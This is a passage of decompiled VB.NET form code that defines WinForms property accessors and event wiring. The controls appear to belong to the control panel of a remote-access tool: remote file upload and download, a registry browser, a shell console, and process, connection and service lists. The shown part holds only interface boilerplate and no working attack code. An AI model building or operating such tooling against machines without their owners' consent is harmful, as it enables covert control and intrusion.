				End If
				Me._UploadToolStripMenuItem = value
				If Me._UploadToolStripMenuItem IsNot Nothing Then
					AddHandler Me._UploadToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F8 RID: 248
		' (get) Token: 0x0600029E RID: 670 RVA: 0x00018A10 File Offset: 0x00016C10
		' (set) Token: 0x0600029F RID: 671 RVA: 0x00018A28 File Offset: 0x00016C28
		Friend Overridable Property NewEmptyFileToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._NewEmptyFileToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.NewEmptyFileToolStripMenuItem_Click
				If Me._NewEmptyFileToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._NewEmptyFileToolStripMenuItem.Click, value2
				End If
				Me._NewEmptyFileToolStripMenuItem = value
				If Me._NewEmptyFileToolStripMenuItem IsNot Nothing Then
					AddHandler Me._NewEmptyFileToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F9 RID: 249
		' (get) Token: 0x060002A0 RID: 672 RVA: 0x00018A80 File Offset: 0x00016C80
		' (set) Token: 0x060002A1 RID: 673 RVA: 0x00018A98 File Offset: 0x00016C98
		Friend Overridable Property NewFolderToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._NewFolderToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.NewFolderToolStripMenuItem_Click
				If Me._NewFolderToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._NewFolderToolStripMenuItem.Click, value2
				End If
				Me._NewFolderToolStripMenuItem = value
				If Me._NewFolderToolStripMenuItem IsNot Nothing Then
					AddHandler Me._NewFolderToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000FA RID: 250
		' (get) Token: 0x060002A2 RID: 674 RVA: 0x00018AF0 File Offset: 0x00016CF0
		' (set) Token: 0x060002A3 RID: 675 RVA: 0x00018B08 File Offset: 0x00016D08
		Friend Overridable Property OpenDownloadsToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._OpenDownloadsToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenDownloadsToolStripMenuItem_Click
				If Me._OpenDownloadsToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._OpenDownloadsToolStripMenuItem.Click, value2
				End If
				Me._OpenDownloadsToolStripMenuItem = value
				If Me._OpenDownloadsToolStripMenuItem IsNot Nothing Then
					AddHandler Me._OpenDownloadsToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000FB RID: 251
		' (get) Token: 0x060002A4 RID: 676 RVA: 0x00018B60 File Offset: 0x00016D60
		' (set) Token: 0x060002A5 RID: 677 RVA: 0x00018B78 File Offset: 0x00016D78
		Friend Overridable Property RarToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RarToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RarToolStripMenuItem_Click
				If Me._RarToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RarToolStripMenuItem.Click, value2
				End If
				Me._RarToolStripMenuItem = value
				If Me._RarToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RarToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000FC RID: 252
		' (get) Token: 0x060002A6 RID: 678 RVA: 0x00018BD0 File Offset: 0x00016DD0
		' (set) Token: 0x060002A7 RID: 679 RVA: 0x00018BE8 File Offset: 0x00016DE8
		Friend Overridable Property UnRarToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UnRarToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UnRarToolStripMenuItem_Click
				If Me._UnRarToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._UnRarToolStripMenuItem.Click, value2
				End If
				Me._UnRarToolStripMenuItem = value
				If Me._UnRarToolStripMenuItem IsNot Nothing Then
					AddHandler Me._UnRarToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000FD RID: 253
		' (get) Token: 0x060002A8 RID: 680 RVA: 0x00018C40 File Offset: 0x00016E40
		' (set) Token: 0x060002A9 RID: 681 RVA: 0x00018C58 File Offset: 0x00016E58
		Friend Overridable Property UploadFromLinkToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UploadFromLinkToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UploadFromLinkToolStripMenuItem_Click
				If Me._UploadFromLinkToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._UploadFromLinkToolStripMenuItem.Click, value2
				End If
				Me._UploadFromLinkToolStripMenuItem = value
				If Me._UploadFromLinkToolStripMenuItem IsNot Nothing Then
					AddHandler Me._UploadFromLinkToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000FE RID: 254
		' (get) Token: 0x060002AA RID: 682 RVA: 0x00018CB0 File Offset: 0x00016EB0
		' (set) Token: 0x060002AB RID: 683 RVA: 0x00002D5C File Offset: 0x00000F5C
		Friend Overridable Property ContextMenuStrip4 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip4 = value
			End Set
		End Property

		' Token: 0x170000FF RID: 255
		' (get) Token: 0x060002AC RID: 684 RVA: 0x00018CC8 File Offset: 0x00016EC8
		' (set) Token: 0x060002AD RID: 685 RVA: 0x00018CE0 File Offset: 0x00016EE0
		Friend Overridable Property RefreshToolStripMenuItem3 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RefreshToolStripMenuItem3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem3_Click
				If Me._RefreshToolStripMenuItem3 IsNot Nothing Then
					RemoveHandler Me._RefreshToolStripMenuItem3.Click, value2
				End If
				Me._RefreshToolStripMenuItem3 = value
				If Me._RefreshToolStripMenuItem3 IsNot Nothing Then
					AddHandler Me._RefreshToolStripMenuItem3.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000100 RID: 256
		' (get) Token: 0x060002AE RID: 686 RVA: 0x00018D38 File Offset: 0x00016F38
		' (set) Token: 0x060002AF RID: 687 RVA: 0x00002D65 File Offset: 0x00000F65
		Friend Overridable Property MG As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._MG
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._MG = value
			End Set
		End Property

		' Token: 0x17000101 RID: 257
		' (get) Token: 0x060002B0 RID: 688 RVA: 0x00018D50 File Offset: 0x00016F50
		' (set) Token: 0x060002B1 RID: 689 RVA: 0x00018D68 File Offset: 0x00016F68
		Friend Overridable Property ListView1 As ListView
			<DebuggerNonUserCode()>
			Get
				Return Me._ListView1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ListView)
				Dim value2 As EventHandler = AddressOf Me.ListView1_SelectedIndexChanged
				If Me._ListView1 IsNot Nothing Then
					RemoveHandler Me._ListView1.SelectedIndexChanged, value2
				End If
				Me._ListView1 = value
				If Me._ListView1 IsNot Nothing Then
					AddHandler Me._ListView1.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000102 RID: 258
		' (get) Token: 0x060002B2 RID: 690 RVA: 0x00018DC0 File Offset: 0x00016FC0
		' (set) Token: 0x060002B3 RID: 691 RVA: 0x00002D6E File Offset: 0x00000F6E
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x17000103 RID: 259
		' (get) Token: 0x060002B4 RID: 692 RVA: 0x00018DD8 File Offset: 0x00016FD8
		' (set) Token: 0x060002B5 RID: 693 RVA: 0x00002D77 File Offset: 0x00000F77
		Friend Overridable Property ColumnHeader2 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader2 = value
			End Set
		End Property

		' Token: 0x17000104 RID: 260
		' (get) Token: 0x060002B6 RID: 694 RVA: 0x00018DF0 File Offset: 0x00016FF0
		' (set) Token: 0x060002B7 RID: 695 RVA: 0x00002D80 File Offset: 0x00000F80
		Friend Overridable Property vmethod_148 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_148
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._vmethod_148 = value
			End Set
		End Property

		' Token: 0x17000105 RID: 261
		' (get) Token: 0x060002B8 RID: 696 RVA: 0x00018E08 File Offset: 0x00017008
		' (set) Token: 0x060002B9 RID: 697 RVA: 0x00002D89 File Offset: 0x00000F89
		Friend Overridable Property Timer1 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._Timer1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Me._Timer1 = value
			End Set
		End Property

		' Token: 0x17000106 RID: 262
		' (get) Token: 0x060002BA RID: 698 RVA: 0x00018E20 File Offset: 0x00017020
		' (set) Token: 0x060002BB RID: 699 RVA: 0x00002D92 File Offset: 0x00000F92
		Friend Overridable Property FMM As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._FMM
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._FMM = value
			End Set
		End Property

		' Token: 0x17000107 RID: 263
		' (get) Token: 0x060002BC RID: 700 RVA: 0x00018E38 File Offset: 0x00017038
		' (set) Token: 0x060002BD RID: 701 RVA: 0x00002D9B File Offset: 0x00000F9B
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x17000108 RID: 264
		' (get) Token: 0x060002BE RID: 702 RVA: 0x00018E50 File Offset: 0x00017050
		' (set) Token: 0x060002BF RID: 703 RVA: 0x00018E68 File Offset: 0x00017068
		Friend Overridable Property L1 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._L1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.L1_DoubleClick1
				If Me._L1 IsNot Nothing Then
					RemoveHandler Me._L1.DoubleClick, value2
				End If
				Me._L1 = value
				If Me._L1 IsNot Nothing Then
					AddHandler Me._L1.DoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x17000109 RID: 265
		' (get) Token: 0x060002C0 RID: 704 RVA: 0x00018EC0 File Offset: 0x000170C0
		' (set) Token: 0x060002C1 RID: 705 RVA: 0x00002DA4 File Offset: 0x00000FA4
		Friend Overridable Property ColumnHeader6 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader6 = value
			End Set
		End Property

		' Token: 0x1700010A RID: 266
		' (get) Token: 0x060002C2 RID: 706 RVA: 0x00018ED8 File Offset: 0x000170D8
		' (set) Token: 0x060002C3 RID: 707 RVA: 0x00002DAD File Offset: 0x00000FAD
		Friend Overridable Property ColumnHeader7 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader7 = value
			End Set
		End Property

		' Token: 0x1700010B RID: 267
		' (get) Token: 0x060002C4 RID: 708 RVA: 0x00018EF0 File Offset: 0x000170F0
		' (set) Token: 0x060002C5 RID: 709 RVA: 0x00002DB6 File Offset: 0x00000FB6
		Friend Overridable Property p As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._p
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._p = value
			End Set
		End Property

		' Token: 0x1700010C RID: 268
		' (get) Token: 0x060002C6 RID: 710 RVA: 0x00018F08 File Offset: 0x00017108
		' (set) Token: 0x060002C7 RID: 711 RVA: 0x00018F20 File Offset: 0x00017120
		Friend Overridable Property L2 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._L2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.L2_SelectedIndexChanged
				Dim value3 As EventHandler = AddressOf Me.L2_DoubleClick
				If Me._L2 IsNot Nothing Then
					RemoveHandler Me._L2.SelectedIndexChanged, value2
					RemoveHandler Me._L2.DoubleClick, value3
				End If
				Me._L2 = value
				If Me._L2 IsNot Nothing Then
					AddHandler Me._L2.SelectedIndexChanged, value2
					AddHandler Me._L2.DoubleClick, value3
				End If
			End Set
		End Property

		' Token: 0x1700010D RID: 269
		' (get) Token: 0x060002C8 RID: 712 RVA: 0x00018F9C File Offset: 0x0001719C
		' (set) Token: 0x060002C9 RID: 713 RVA: 0x00002DBF File Offset: 0x00000FBF
		Friend Overridable Property ColumnHeader8 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader8 = value
			End Set
		End Property

		' Token: 0x1700010E RID: 270
		' (get) Token: 0x060002CA RID: 714 RVA: 0x00018FB4 File Offset: 0x000171B4
		' (set) Token: 0x060002CB RID: 715 RVA: 0x00002DC8 File Offset: 0x00000FC8
		Friend Overridable Property ColumnHeader9 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader9
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader9 = value
			End Set
		End Property

		' Token: 0x1700010F RID: 271
		' (get) Token: 0x060002CC RID: 716 RVA: 0x00018FCC File Offset: 0x000171CC
		' (set) Token: 0x060002CD RID: 717 RVA: 0x00002DD1 File Offset: 0x00000FD1
		Friend Overridable Property ColumnHeader10 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader10
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader10 = value
			End Set
		End Property

		' Token: 0x17000110 RID: 272
		' (get) Token: 0x060002CE RID: 718 RVA: 0x00018FE4 File Offset: 0x000171E4
		' (set) Token: 0x060002CF RID: 719 RVA: 0x00002DDA File Offset: 0x00000FDA
		Friend Overridable Property LTCP As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._LTCP
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._LTCP = value
			End Set
		End Property

		' Token: 0x17000111 RID: 273
		' (get) Token: 0x060002D0 RID: 720 RVA: 0x00018FFC File Offset: 0x000171FC
		' (set) Token: 0x060002D1 RID: 721 RVA: 0x00002DE3 File Offset: 0x00000FE3
		Friend Overridable Property ColumnHeader16 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader16
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader16 = value
			End Set
		End Property

		' Token: 0x17000112 RID: 274
		' (get) Token: 0x060002D2 RID: 722 RVA: 0x00019014 File Offset: 0x00017214
		' (set) Token: 0x060002D3 RID: 723 RVA: 0x00002DEC File Offset: 0x00000FEC
		Friend Overridable Property ColumnHeader17 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader17
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader17 = value
			End Set
		End Property

		' Token: 0x17000113 RID: 275
		' (get) Token: 0x060002D4 RID: 724 RVA: 0x0001902C File Offset: 0x0001722C
		' (set) Token: 0x060002D5 RID: 725 RVA: 0x00002DF5 File Offset: 0x00000FF5
		Friend Overridable Property ColumnHeader18 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader18
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader18 = value
			End Set
		End Property

		' Token: 0x17000114 RID: 276
		' (get) Token: 0x060002D6 RID: 726 RVA: 0x00019044 File Offset: 0x00017244
		' (set) Token: 0x060002D7 RID: 727 RVA: 0x00002DFE File Offset: 0x00000FFE
		Friend Overridable Property ColumnHeader19 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader19
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader19 = value
			End Set
		End Property

		' Token: 0x17000115 RID: 277
		' (get) Token: 0x060002D8 RID: 728 RVA: 0x0001905C File Offset: 0x0001725C
		' (set) Token: 0x060002D9 RID: 729 RVA: 0x00002E07 File Offset: 0x00001007
		Friend Overridable Property ColumnHeader20 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader20
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader20 = value
			End Set
		End Property

		' Token: 0x17000116 RID: 278
		' (get) Token: 0x060002DA RID: 730 RVA: 0x00019074 File Offset: 0x00017274
		' (set) Token: 0x060002DB RID: 731 RVA: 0x00002E10 File Offset: 0x00001010
		Friend Overridable Property ColumnHeader21 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader21
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader21 = value
			End Set
		End Property

		' Token: 0x17000117 RID: 279
		' (get) Token: 0x060002DC RID: 732 RVA: 0x0001908C File Offset: 0x0001728C
		' (set) Token: 0x060002DD RID: 733 RVA: 0x00002E19 File Offset: 0x00001019
		Friend Overridable Property RG As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._RG
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._RG = value
			End Set
		End Property

		' Token: 0x17000118 RID: 280
		' (get) Token: 0x060002DE RID: 734 RVA: 0x000190A4 File Offset: 0x000172A4
		' (set) Token: 0x060002DF RID: 735 RVA: 0x000190BC File Offset: 0x000172BC
		Friend Overridable Property RGLIST As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._RGLIST
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.RGLIST_DoubleClick
				If Me._RGLIST IsNot Nothing Then
					RemoveHandler Me._RGLIST.DoubleClick, value2
				End If
				Me._RGLIST = value
				If Me._RGLIST IsNot Nothing Then
					AddHandler Me._RGLIST.DoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x17000119 RID: 281
		' (get) Token: 0x060002E0 RID: 736 RVA: 0x00019114 File Offset: 0x00017314
		' (set) Token: 0x060002E1 RID: 737 RVA: 0x00002E22 File Offset: 0x00001022
		Friend Overridable Property ColumnHeader3 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader3 = value
			End Set
		End Property

		' Token: 0x1700011A RID: 282
		' (get) Token: 0x060002E2 RID: 738 RVA: 0x0001912C File Offset: 0x0001732C
		' (set) Token: 0x060002E3 RID: 739 RVA: 0x00002E2B File Offset: 0x0000102B
		Friend Overridable Property ColumnHeader4 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader4 = value
			End Set
		End Property

		' Token: 0x1700011B RID: 283
		' (get) Token: 0x060002E4 RID: 740 RVA: 0x00019144 File Offset: 0x00017344
		' (set) Token: 0x060002E5 RID: 741 RVA: 0x00002E34 File Offset: 0x00001034
		Friend Overridable Property ColumnHeader5 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader5 = value
			End Set
		End Property

		' Token: 0x1700011C RID: 284
		' (get) Token: 0x060002E6 RID: 742 RVA: 0x0001915C File Offset: 0x0001735C
		' (set) Token: 0x060002E7 RID: 743 RVA: 0x00019174 File Offset: 0x00017374
		Friend Overridable Property RGk As TreeView
			<DebuggerNonUserCode()>
			Get
				Return Me._RGk
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TreeView)
				Dim value2 As TreeViewEventHandler = AddressOf Me.RGk_AfterExpand
				Dim value3 As TreeViewEventHandler = AddressOf Me.RGk_AfterCollapse
				Dim value4 As TreeNodeMouseClickEventHandler = AddressOf Me.RGk_NodeMouseClick
				Dim value5 As TreeViewEventHandler = AddressOf Me.RGk_AfterSelect
				If Me._RGk IsNot Nothing Then
					RemoveHandler Me._RGk.AfterExpand, value2
					RemoveHandler Me._RGk.AfterCollapse, value3
					RemoveHandler Me._RGk.NodeMouseDoubleClick, value4
					RemoveHandler Me._RGk.AfterSelect, value5
				End If
				Me._RGk = value
				If Me._RGk IsNot Nothing Then
					AddHandler Me._RGk.AfterExpand, value2
					AddHandler Me._RGk.AfterCollapse, value3
					AddHandler Me._RGk.NodeMouseDoubleClick, value4
					AddHandler Me._RGk.AfterSelect, value5
				End If
			End Set
		End Property

		' Token: 0x1700011D RID: 285
		' (get) Token: 0x060002E8 RID: 744 RVA: 0x0001923C File Offset: 0x0001743C
		' (set) Token: 0x060002E9 RID: 745 RVA: 0x00019254 File Offset: 0x00017454
		Friend Overridable Property sh As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._sh
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Dim value2 As EventHandler = AddressOf Me.sh_Resize
				If Me._sh IsNot Nothing Then
					RemoveHandler Me._sh.Resize, value2
				End If
				Me._sh = value
				If Me._sh IsNot Nothing Then
					AddHandler Me._sh.Resize, value2
				End If
			End Set
		End Property

		' Token: 0x1700011E RID: 286
		' (get) Token: 0x060002EA RID: 746 RVA: 0x000192AC File Offset: 0x000174AC
		' (set) Token: 0x060002EB RID: 747 RVA: 0x00002E3D File Offset: 0x0000103D
		Friend Overridable Property T1 As RichTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RichTextBox)
				Me._T1 = value
			End Set
		End Property

		' Token: 0x1700011F RID: 287
		' (get) Token: 0x060002EC RID: 748 RVA: 0x000192C4 File Offset: 0x000174C4
		' (set) Token: 0x060002ED RID: 749 RVA: 0x000192DC File Offset: 0x000174DC
		Friend Overridable Property T2 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As KeyEventHandler = AddressOf Me.T2_KeyDown
				If Me._T2 IsNot Nothing Then
					RemoveHandler Me._T2.KeyDown, value2
				End If
				Me._T2 = value
				If Me._T2 IsNot Nothing Then
					AddHandler Me._T2.KeyDown, value2
				End If
			End Set
		End Property

		' Token: 0x17000120 RID: 288
		' (get) Token: 0x060002EE RID: 750 RVA: 0x00019334 File Offset: 0x00017534
		' (set) Token: 0x060002EF RID: 751 RVA: 0x00002E46 File Offset: 0x00001046
		Friend Overridable Property LPR As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._LPR
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._LPR = value
			End Set
		End Property

		' Token: 0x17000121 RID: 289
		' (get) Token: 0x060002F0 RID: 752 RVA: 0x0001934C File Offset: 0x0001754C
		' (set) Token: 0x060002F1 RID: 753 RVA: 0x00002E4F File Offset: 0x0000104F
		Friend Overridable Property ColumnHeader22 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader22
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader22 = value
			End Set
		End Property

		' Token: 0x17000122 RID: 290
		' (get) Token: 0x060002F2 RID: 754 RVA: 0x00019364 File Offset: 0x00017564
		' (set) Token: 0x060002F3 RID: 755 RVA: 0x00002E58 File Offset: 0x00001058
		Friend Overridable Property ColumnHeader23 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader23
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader23 = value
			End Set
		End Property

		' Token: 0x17000123 RID: 291
		' (get) Token: 0x060002F4 RID: 756 RVA: 0x0001937C File Offset: 0x0001757C
		' (set) Token: 0x060002F5 RID: 757 RVA: 0x00002E61 File Offset: 0x00001061
		Friend Overridable Property ColumnHeader24 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader24
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader24 = value
			End Set
		End Property

		' Token: 0x17000124 RID: 292
		' (get) Token: 0x060002F6 RID: 758 RVA: 0x00019394 File Offset: 0x00017594
		' (set) Token: 0x060002F7 RID: 759 RVA: 0x00002E6A File Offset: 0x0000106A
		Friend Overridable Property ColumnHeader25 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader25
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader25 = value
			End Set
		End Property

		' Token: 0x17000125 RID: 293
		' (get) Token: 0x060002F8 RID: 760 RVA: 0x000193AC File Offset: 0x000175AC
		' (set) Token: 0x060002F9 RID: 761 RVA: 0x00002E73 File Offset: 0x00001073
		Friend Overridable Property ColumnHeader26 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader26
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader26 = value
			End Set
		End Property

		' Token: 0x17000126 RID: 294
		' (get) Token: 0x060002FA RID: 762 RVA: 0x000193C4 File Offset: 0x000175C4
		' (set) Token: 0x060002FB RID: 763 RVA: 0x00002E7C File Offset: 0x0000107C
		Friend Overridable Property LSRV As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._LSRV
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._LSRV = value
			End Set
		End Property

		' Token: 0x17000127 RID: 295
		' (get) Token: 0x060002FC RID: 764 RVA: 0x000193DC File Offset: 0x000175DC
		' (set) Token: 0x060002FD RID: 765 RVA: 0x00002E85 File Offset: 0x00001085
		Friend Overridable Property ColumnHeader11 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader11
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader11 = value
			End Set
		End Property

		' Token: 0x17000128 RID: 296
